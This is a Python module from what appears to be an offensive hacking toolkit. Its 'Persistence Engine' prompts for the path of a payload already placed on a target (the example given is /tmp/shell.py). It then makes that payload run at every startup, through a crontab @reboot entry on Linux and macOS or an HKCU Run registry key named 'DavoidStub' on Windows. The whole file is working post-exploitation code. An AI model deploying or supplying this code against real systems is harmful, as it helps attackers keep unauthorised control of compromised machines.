import os
import sys
import platform
import subprocess
from rich.console import Console
from core.ui import draw_header

console = Console()

def install_persistence_linux(payload_path):
    """
    Establishes persistence on Linux using the crontab @reboot method.
    """
    try:
        # Use absolute path for reliability
        abs_payload = os.path.abspath(payload_path)
        # 
        cron_command = f"(crontab -l 2>/dev/null; echo '@reboot {abs_payload}') | crontab -"
        subprocess.run(cron_command, shell=True, check=True)
        console.print(f"[bold green][+] Persistence installed via Crontab for: {abs_payload}[/bold green]")
    except Exception as e:
        console.print(f"[bold red][!] Linux Persistence Error: {e}[/bold red]")

def install_persistence_windows(payload_path):
    """
    Establishes persistence on Windows using Registry Run keys.
    """
    try:
        import winreg
        # 
        abs_payload = os.path.abspath(payload_path)
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "DavoidStub", 0, winreg.REG_SZ, abs_payload)
        console.print(f"[bold green][+] Persistence installed via Registry for: {abs_payload}[/bold green]")
    except ImportError:
        console.print("[bold red][!] 'winreg' module only available on Windows.[/bold red]")
    except Exception as e:
        console.print(f"[bold red][!] Windows Persistence Error: {e}[/bold red]")

def run_persistence_engine():
    draw_header("Persistence Engine")
    
    console.print("[bold yellow][*] Preparation:[/bold yellow] Ensure your payload is already on the target.")
    payload_path = console.input("[bold cyan]Enter path to payload (e.g., /tmp/shell.py): [/bold cyan]").strip()
    
    if not payload_path or not os.path.exists(payload_path):
        console.print("[bold red][!] Error: Invalid payload path.[/bold red]")
        return

    os_type = platform.system()
    console.print(f"[*] Detected OS: [bold cyan]{os_type}[/bold cyan]")
    
    confirm = console.input(f"Install persistence for {os_type}? (y/N): ").lower()
    
    if confirm == 'y':
        if os_type == "Linux" or os_type == "Darwin":
            install_persistence_linux(payload_path)
        elif os_type == "Windows":
            install_persistence_windows(payload_path)
        else:
            console.print("[bold red][!] OS not supported for automated persistence.[/bold red]")

    console.print("\n[bold white]Press Enter to return to Command Center...[/bold white]", end="")
    input()